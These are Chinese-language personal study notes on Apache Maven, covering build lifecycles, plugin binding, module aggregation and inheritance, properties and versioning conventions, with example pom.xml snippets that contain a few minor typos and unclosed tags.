![image-20240113121002197](./img/小米虫爬山路-img/image-20240113121002197.png)

编译 --> 测试编译 --> 测试 --> 打包 --> 下载

Maven对项目构建的生命周期划分为3套

- clean:清理工作
- default: 核心工作，例如编译，测试，打包，部署等
- site:产生报告，发布站点等

##### 8.6.2 clean生命周期

pre-clean:执行一些需要在clean之前完成的工作

clean:移除所有上一次构建生成的文件

post-clean:执行一些需要在clean之后立刻完成的工作

##### 8.6.3 default生命周期

- validate (校验):校验项目是否正确并且所有必要的信息可以完成项目的构建过程
- initialize (初始化):初始化构建状态，比如设置属性值
- generate-sources (生成源代码):生成包含在编译阶段中的任何源代码
- process-sources (处理源代码):处理源代码，比如说，过滤任意值.
- generate-resources (生成资源文件):生成将会包含在项目包中的资源文件
- process-resources (处理资源文件):复制和处理资源到目标目录，为打包阶段最好准备
- compile (编译):编译项目的源代码。
- process-classes (处理类文件):处理编译生成的文件，比如说对Java class文件做字节码改善优化。
- generate-test-sources (生成测试源代码):生成包含在编译阶段中的任何测试源代码
- process-test-sources (处理测过源代码):处理测试源代码，比如说，过滤任意值
- generate-test-resources (生成测试资源文件):为测试创建资源文件。
- process-test-resources (处理测试资源文件):复制和处理测试资源到目标目录
- test-compile (编译测试源码):编译测试源代码到测试目标目录
- process-test-classes (处理测试类文件):处理测试源码编译生成的文件。
- test (测试):使用合适的单元测试框架运行测试 (Juint是其中之一)
- prepare-package (准备打包):在实际打包之前，执行任何的必要的操作为打包做准备。
- package (打包):将编译后的代码打包成可分发格式的文件，比如JAR、WAR或者EAR文件。
- pre-integration-test (集成测试前):在执行集成测试前进行必要的动作。比如说，搭建需要的环境。
- integration-test (集成测试):处理和部署项目到可以运行集成测试环境中。
- post-integration-test (集成测试后):在执行集成测试完成后进行必要的动作。比如说，清理集成测试环境
- verify(验证):运行任意的检查来验证项目包有效且达到质量标准。
- install(安装):安装项目包到本地仓库，这样项目包可以用作其他本地项目的依赖
- deploy (部署):将最终的项目包复制到远程仓库中与其他开发者和项目共享。

##### 8.6.4 site构建生命周期

- pre-site:执行一些需要在生成站点文档之前完成的工作
- site:生成项目的站点文档
- post-site:执行一些需要在生成站点文档之后完成的工作，并且为部署做准备
- site-deploy:将生成的站点文档部署到特定的服务器上

##### 8.6.5 插件

- 插件与生命周期内的阶段绑定，在执行到对应生命周期时执行对应的插件功能
- 默认maven在各个生命周期上绑定有预设的功能
- 通过插件可以自定义其他功能

插件导入格式如下:

```xml
<build>
	<plugins>
		<plugin>
			<groupId>org.apache.maven.plugins</groupId>     <!--插件坐标-->
			<artifactId>maven-source-plugin</artifactId>
			<version>2.2.1</version>
			<executions>   <!--用于定义特定插件目标（goal）的执行方式和配置。-->
				<execution> 
					<goals> 
						<goal>jar</goal>       <!--告诉插件打包那个范围代码的包，不是所有插件都有-->
					</goals>
					<phase>generate-test-resources</phase>    <!--告诉Maven在什么阶段执行该插件-->
				</execution>
			</executions>
		</plugin>
	</plugins>
</build
```



#### 8.7 分模块开发和设计

传统属于包模式开发，但是在后续开发的时候一个人不可能开发全部的项目，要使用模块是开发来解决。

![image-20240113124515063](./img/小米虫爬山路-img/image-20240113124515063.png)

#### 8.8 聚合模块

##### 8.8.1 多模块构建维护

在多模块中我们不会知道某个模块是否更新，所以我们要给多模块添加一个聚合模块用于聚合多模块。

![image-20240114092129341](./img/小米虫爬山路-img/image-20240114092129341.png)

聚合项目不写任何代码，并且配置打包方式为pom，主要用于聚合工程。

##### 8.8.2 聚合

**作用:聚合用于快速构建maven工程，一次性构建多个项目/模块。**
	制作方式:
		创建一个空模块，打包类型定义为pom

```xml
<packaging>pom</packaging>
```

​	定义当前模块进行构建操作时关联的其他模块名称

```xml
<modules>
	<module>模块1</module>
	<module>模块2</module>
	<module>模块3</module>
	<module>模块4</module>
</modules
```

**注意事项:参与聚合操作的模块最终执行顺序与模块间的依赖关系有关，与配置顺序无关**

#### 8.9 继承

##### 8.9.1 模块依赖关系

在多模块使用时，会出现版本不兼容等问题，我们需要使用一个父项目模块来做总控制管理。

![image-20240114093301620](./img/小米虫爬山路-img/image-20240114093301620.png)

##### 8.9.2 继承

**作用:通过继承可以实现在子工程中沿用父工程中的配置**
		maven中的继承与java中的继承相似，在子工程中配置继承关系
	制作方式:
		在子工程中声明其父工程坐标与对应的位置

```xml
<!--定义该项目的父项目 -->
<parent>
	<groupId>群组id</groupId>
	<artifactId>工件id</artifactId>
	<version>1.0-SNAPSHOT</version>
	<!-- pom -->
	<relativePath>父项目pom文件的相对位置</relativePath>
</parent>
```

##### 8.9.3 继承依赖定义

在父项目中定义依赖管理

```xml
<dependencyManagement>
	<dependencies> 
        <!--添加依赖-->
		<dependency>
			<groupId>org.springframework</groupId>
			<artifactId>spring-context</artifactId>
			<version>5.1.9.RELEASE</version>
		</dependency>
	<dependencies>
    </dependencyManagement>
```

##### 8.9.4 继承依赖的使用

在子工程中定义依赖关系，无需声明依赖版本，版本参照父工程中依赖的版本

```xml
<dependencies>
<!--在子工程中直接使用不写版本号-->
	<dependency>
		<groupId>org.springframework</groupId>
		<artifactId>spring-context</artifactId>
	</dependency>
</dependencies>
```

##### 8.9.5 继承的资源

groupld:项目组ID，项目坐标的核心元素
	version:项目版本，项目坐标的核心因素
	description:项目的描述信息
	organization:项目的组织信息
	inceptionYear:项目的创始年份
	url: 项目的URL地址
	developers:项目的开发者信息
	contributors:项目的贡献者信息
	distributionManagement:项目的部署配置
	issueManagement:项目的缺陷跟踪系统信息
	ciManagement:项目的持续集成系统信息
	scm:项目的版本控制系统西溪
	malilingLists:项目的邮件列表信息
	properties:自定义的Maven属性
	dependencies:项目的依赖配置
	dependencyManagement:项目的依赖管理配置
	repositories:项目的仓库配置
	build:包括项目的源码目录配置、输出目录配置、插件配置、插件管理配置等
	reporting:包括项目的报告输出目录配置、报告插件配置等

##### 8.9.6 继承和聚合

作用：

- 聚合用于快速构建项目
- 继承用于快速配置

相同点：

- 聚合与继承的pom.xml文件打包方式均为pom，可以将两种关系制作到同一个pom文件中	
- 聚合与继承均属于设计型模块，并无实际的模块内容

不同点:

- 聚合是在当前模块中配置关系，聚合可以感知到参与聚合的模块有哪些
- 继承是在子模块中配置关系，父模块无法感知哪些子模块继承了自己

#### 8.10 属性

属性就是变量，在依赖中使用变量，修改变量在使用的时候都会改变。

##### 8.10.1 属性类别

- 自定义属性
- 内置属性
- Setting属性
- Java系统属性
- 环境变量属性

##### 8.10.2 属性类别:自定义属性

作用:等同于定义变量，方便统一维护
	定义格式:

```xml
<!--定义属性-->
<properties>
	<spring.version>5.1.9.RELEASE</spring.version>
	<junit.version>4.12</junit.version>
</properties>
```

调用格式:

```xml
<dependency>
	<groupId>org.springframework</groupId>
	<artifactId>spring-context</artifactId>
	<version>${spring.version}</version>
</dependency>
```

##### 8.10.3 属性类别:内置属性

作用:使用maven内置属性，快速配置。

调用格式：

```xml
${basedir}
${version}
```

##### 8.10.4 属性类别:Setting属性

作用:使用Maven配置文件setting.xml中的标签属性，用于动态配置。

调用格式:

```xml
${settings.localRepository}
```

##### 8.10.5 属性类别java系统属性

作用:读取java系统属性

调用格式:

```xml
${user.name}
```

系统属性查询方式:

```xml
mvn help:system
```

##### 8.10.6 属性类别:环境变量属性

作用:使用Maven配置文件setting.xml中的标签属性，用于动态配置

调用格式:

```xml
${env.JAVA_HOME}
```

环境变量属性查询方式:

```xml
mvn help:system
```

#### 8.11 版本管理

##### 8.11.1 工程版本

SNAPSHOT(快照版本)

- 项目开发过程中，为方便团队成员合作，解决模块间相互依赖和时时更新的问题，开发者对每个模块进行构建的时候，输出的临时性版本叫快照版本(测试阶段版本)
- 快照版本会随着开发的进展不断更新

RELEASE(发布版本)

- 项目开发到进入阶段里程碑后，向团队外部发布较为稳定的版本，这种版本所对应的构件文件
- 是稳定的，即便进行功能的后续开发，也不会改变当前发布版本内容，这种版本称为发布版本

##### 8.11.2 版本约定

约定规范:

​	<主版本><次版本><增量版本><里程碑版本>

​	主版本:表示项目重大架构的变更，如:spring5相较于spring4的迭代
​		次版本:表示有较大的功能增加和变化，或者全面系统地修复漏洞
​		增量版本:表示有重大漏洞的修复
​		里程碑版本:表明一个版本的里程碑(版本内部)。这样的版本同下一个正式版本相比，相对来说不是很稳定，有待更多的测试
​	范例:
​	5.19.RELEASE

